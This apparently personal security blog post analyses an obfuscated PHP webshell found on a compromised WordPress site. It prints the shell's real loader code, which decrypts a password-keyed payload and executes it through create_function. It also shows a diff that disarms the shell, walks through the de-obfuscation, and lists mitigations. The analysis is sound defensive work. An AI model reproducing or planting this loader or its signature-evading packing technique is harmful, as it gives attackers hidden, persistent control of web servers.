---
layout: post
title: "Highly obfusticated PHP webshell"
date: 2015-11-26 18:54
comments: true
categories:
- security
- php
- webshell
- compromise
- ioc
- wordpress
---

If there's one thing to be said for Wordpress blogs, it's that users rarely seem to understand than keeping things up to date is really going to stop them from getting owned 9/10 times.

So if you take one thing away from this post please make sure it's:

1. *KEEP YOUR WORDPRESS INSTALL UP TO DATE*
2. *KEEP ALL YOUR WORDPRESS PLUGINS UP TO DATE*

Simple enough right? You would have thought so, but of course this isn't a "cure all" and there's other vulnerabilites and mitigations to consider; but not for this post.

# RFU

*Remote File Upload*.

So the site in question had a plugin which was out of date. This plugin had a RFU vulnerability which allowed attackers to upload arbitrary code files then head to

https://thesite.com/wp-content/pluginname/uploadedfile.php 

To execute the attack.

Standard, boring crap right ? 

Well this post isn't to focus on how it happened, nor why it happed. 

Simply put the php file itself I found *very interesting*.

# PHP Code obfustication

Sure, code obfustication is nothing new. Heck tools like msfvenom allow you to choose from a variety of obfustication methods the premis for which is to avoid signatures for "known bad" files, and thus avoid common signatures (which is why you should not rely solely on signature bases analysis).

The thing is the overwhelming majority of webshell obfustication is done through "packing", you'll see it use base64, gzinflate, eval and that's a pretty common standard.

Not this little *bastard*, and that's why this got my attention

Head of the file:

```php
<?php $wp__wp='base'.(32*2).'_de'.'code';$wp__wp=$wp__wp(str_replace("\n", '', 'QOC7sj/9Bh8g6EJWtzJjaKUSdpGj/VzFUKzIhEUBQzNS4Il8OaZdAcKdt4ix0eWNniRKnvuBmTO2W39H
d7VmyCL7+MB1t1eOa8wWJiYQqisMKzcIhXvmOdkg4LTsDk6HIm+rsjD2nlcBpGKNVW+/irhPtk6zlOIq
aUVBxVWCJ7CT30ogudYn0spol2MwyvBRWJHwaKlKY3bYQ39LodSJUGhlB3tJAMiAvCMLpWp91UHt+Ukm
aHypp+OTC9oWJSwpwALTqIX+z2Yetp8r3RRBf2JYPiUtxuuEsxi4lIGM477sPiLqhFJLI7wiV35oyUJJ
G9Zv4OWsozkEARLUEBqKlxlH21b0+Sv568ea9hMD/JhLLx7TeG3wsqfHQ5yxIY2GTHHq9eT3yeGCteT4
xprMpl7rNcEtG1b6Ez9SSsbG61fEHg4ozeVVyrEPlDscsyXlhysW2kDf1CLg0URWuW7GsiJ2xPsyG+RX
ctsM+8t+W4nbM1AyuxSQv03OoA3R0sGLeicrm41VByDI0lDlwfmwq1K1jT2KsXD60BA/PDs2FBB9IfhJ
awK1/tFiGbi+G/gb9KLEzrr8ZCgkTqH8RWJ/avnDbK/DMBy5rZzVU/VEFNaRTVyN5lBxphQ6nJpT9vM5
Z5Cu7f8PYmaBthyP3iqZk/ur0i1+64uyYe9XaiXkORQ/F90DEaY0m3MAxIptHs8lQMclnoIX27gTJnAv
NpcyJgsM5Z8w/6dApQTxWU4/iA+QIKZATqlKYDpuScahCgOIlenxBhEsjB7s2mpG82vcs+/FoxuobVLZ
```

Well, that's ... *Interesting* ...

Tail of the file

```php
'));$wp_wp=isset($_POST['wp_wp'])?$_POST['wp_wp']:(isset($_COOKIE['wp_wp'])?$_COOKIE['wp_wp']:NULL);if($wp_wp!==NULL){$wp_wp=md5($wp_wp).substr(md5(strrev($wp_wp)),0,strlen($wp_wp));for($wp___wp=0;$wp___wp<15324;$wp___wp++){$wp__wp[$wp___wp]=chr(( ord($wp__wp[$wp___wp])-ord($wp_wp[$wp___wp]))%256);$wp_wp.=$wp__wp[$wp___wp];}if($wp__wp=@gzinflate($wp__wp)){if(isset($_POST['wp_wp']))@setcookie('wp_wp', $_POST['wp_wp']);$wp___wp=create_function('',$wp__wp);unset($wp__wp,$wp_wp);$wp___wp();}}?><form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>
```

## Long string is loooooooong ...

So first it's a base64 encoded string; we know this due to the first line of code which is doing some signature evasion itself.

```php
$wp__wp='base'.(32*2).'_de'.'code';
```

Which of course yields 'base64_decode'

So then the next line

```php
$wp__wp=$wp__wp(str_replace("\n", '', 'QOC7
```

Is really:

```
$wp__wp=base64_decode(<payload>)
```

So let's use some python ...

```
>>> payload="""QOC7s...""".replace("\n","")
>>> len(payload)
20432
>>> from base64 import b64decode
>>> b64decode(payload)
'@\xe0\xbb\xb2?\xfd\x06\x1f
...
```

So we have some raw intelligibile data, the WTF continues ...

## So what now?

Let's look at the tail of the file again it's doing some additional processing let's add some whitespace and comments to make it readable

```php
//Ternary if statements
//if we have the password in the POST or COOKIE var set $wp_wp to this. If not set $wp_wp to null
$wp_wp = isset($_POST['wp_wp']) ? $_POST['wp_wp'] : (isset($_COOKIE['wp_wp']) ? $_COOKIE['wp_wp'] : NULL);

//If wp_wp is not NULL (so we have a password set from the above)
if( $wp_wp !== NULL ) {
    //mutate the var
    $wp_wp = md5($wp_wp).substr(md5(strrev($wp_wp)),0,strlen($wp_wp));
    //assuming: test123 as the password.
    /*
     * php -r '$wp_wp = "test123"; $wp_wp = md5($wp_wp).substr(md5(strrev($wp_wp)),0,strlen($wp_wp)); echo $wp_wp;'
     * cc03e747a6afbbcbf8be7668acfebee56a54720
     */ 
   
    //wp___wp is just an integer itterator, for for readability I'm substituting this for $i 
    for( $i = 0; $i < 15324; $i++){
        //wp__wp is the payload so I'm renaming this also to $payload
        //each char is unpacked by the following line
        $payload[$i] = chr(( ord($payload[$i]) - ord($wp_wp[$i])) % 256);
        //this is then appended to wp_wp (which is the password)
        $wp_wp .= $payload[$i];
    }
  
    if ( $payload = @gzinflate($payload)) {
        if( isset($_POST['wp_wp']) ) @setcookie('wp_wp', $_POST['wp_wp']);
        //recall this line from above: $wp__wp='base'.(32*2).'_de'.'code'
        //$i therefor is base64_decode(<unpacked payload>);
        $i = create_function('',$payload);
        unset($payload,$wp_wp);
        $i();
    }
}?>
<form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>
```

I suppose we _could_ go the python route again, however as we've discerned the function (loop unpack payload -> create_function -> execute function), we can "disarm" it to instead echo out the unpacked code for further analysis.


So the file with the required modifications ...

```
257c257,266
< '));$wp_wp=isset($_POST['wp_wp'])?$_POST['wp_wp']:(isset($_COOKIE['wp_wp'])?$_COOKIE['wp_wp']:NULL);if($wp_wp!==NULL){$wp_wp=md5($wp_wp).substr(md5(strrev($wp_wp)),0,strlen($wp_wp));for($wp___wp=0;$wp___wp<15324;$wp___wp++){$wp__wp[$wp___wp]=chr(( ord($wp__wp[$wp___wp])-ord($wp_wp[$wp___wp]))%256);$wp_wp.=$wp__wp[$wp___wp];}if($wp__wp=@gzinflate($wp__wp)){if(isset($_POST['wp_wp']))@setcookie('wp_wp', $_POST['wp_wp']);$wp___wp=create_function('',$wp__wp);unset($wp__wp,$wp_wp);$wp___wp();}}?><form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>
\ No newline at end of file
---
> '));
> 
> $_POST['wp_wp'] = "test123";
> $wp_wp=isset($_POST['wp_wp'])?$_POST['wp_wp']:(isset($_COOKIE['wp_wp'])?$_COOKIE['wp_wp']:NULL);
> if($wp_wp!==NULL){$wp_wp=md5($wp_wp).substr(md5(strrev($wp_wp)),0,strlen($wp_wp));for($wp___wp=0;$wp___wp<15324;$wp___wp++){$wp__wp[$wp___wp]=chr(( ord($wp__wp[$wp___wp])-ord($wp_wp[$wp___wp]))%256);$wp_wp.=$wp__wp[$wp___wp];}if($wp__wp=@gzinflate($wp__wp)){if(isset($_POST['wp_wp']))@setcookie('wp_wp', $_POST['wp_wp']);
> //$wp___wp=create_function('',$wp__wp);unset($wp__wp,$wp_wp);
> //$wp___wp();
> echo $wp__wp;
> 
> }}?><form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>
```

The resulting payload starts off as

```php
@ini_set('log_errors_max_len',0);@ini_restore('log_errors');@ini_restore('error_log');@ini_restore('error_reporting');@ini_set('log_errors',0);@ini_set('error_log',NULL);@ini_set('error_reporting',NULL);@error_
reporting(0);@ini_set('max_execution_time',0);@set_time_limit(0);@ignore_user_abort(TRUE);@ini_set('memory_limit','1000M');@ini_set('file_uploads',1);@ini_restore('magic_quotes_runtime');@ini_restore('magic_quot
es_sybase');
...
```

And continues to create a webshell interface.


#So what?

Granted this may be viewed as little more than a geeks curiosity, however on a more serious note the main intriguing element of this webshell is that the password is an intrinsic part required to unpack the valid payload.

Without the password the unpack will fail; so consider if 

```php
$wp__wp='base'.(32*2).'_de'.'code';
```

Was instead moved to reside inside the packed payload, how would you possibly be able to begin to write a signature for such a file?

Fuzzy logic sure, look for long strings of seemingly random content, still I can see that's going to run false positives in the masses given the various obfusticating options out there for php such as those that require licensing ...

## Mitigation ?

1. SELinux set ON, will limit what the web server process can access (it's not going to stop it getting access to your database servers, and if you have `httpd_can_network_connect` set to true, it's not going to stop it creating a reverse shell either, check out `httpd_can_connect_db` to maintain web app functionality but make it harder for attackers)
2. KEEP UP TO DATE WITH PATCHES, Web application, system packages ... patch all the things!
3. WAF and/or IPS (inspect POST & GET, for SQL, known shell commands and block (will not prevent file download / upload))
4. PHP disable_functions ([I covered this back in 2008](https://www.flickr.com/photos/31732936@N06/3079949402/), [cyberciti has a good write up](http://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/))
